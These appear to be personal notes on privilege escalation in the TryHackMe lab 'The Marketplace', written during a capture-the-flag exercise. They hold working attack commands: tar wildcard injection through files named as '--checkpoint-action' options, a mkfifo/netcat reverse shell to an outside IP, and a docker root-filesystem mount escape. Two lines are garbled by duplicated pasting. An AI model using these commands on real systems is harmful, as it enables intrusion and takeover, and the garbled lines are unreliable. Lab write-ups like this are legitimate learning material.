Password works, now lets privesc!

WHAT WE'RE DOING HERE IS ESSENTIALLY MAKING USE OF THE SHELL FUNCTION FROM TAR FOUND ON GTFOBINS (however a slight variation)
<https://gtfobins.github.io/gtfobins/tar/#shell>
and since jake can run that script from michael with sudo -u, we will be able to get onto michael 

sudo -u michael /opt/backups/backup.sh

tar xC /tmp/ -f backup.tar

Made a shell called shell.sh

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.13.31.108 443 >/tmp/f

touch "/opt/backups/--checkpoint=1"
touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"

python3 -c 'import pty;pty.spawn("/bpython3 -c 'import pty;pty.spawn("/bin/bash")'

docker run -v /:/mnt --rm -it alpinedocker run -v /:/mnt --rm -it alpine chroot /mnt sh![unnamed_f1c05b6a7be24f03b5fa1b6568cc7b87](docs/Attachments/_Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/privesc/{{notename}}-202605011742.png)
![unnamed_488539a8e5344f7da6a400bf33667c22](docs/Attachments/_Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/privesc/{{notename}}-202605011742-1.png)
![unnamed_bc7a23ec92004834b7ccc9c9ca603743](docs/Attachments/_Methodology/9.%20CTF%20Boxes/TryHackMe/The%20Marketplace/privesc/{{notename}}-202605011742-2.png)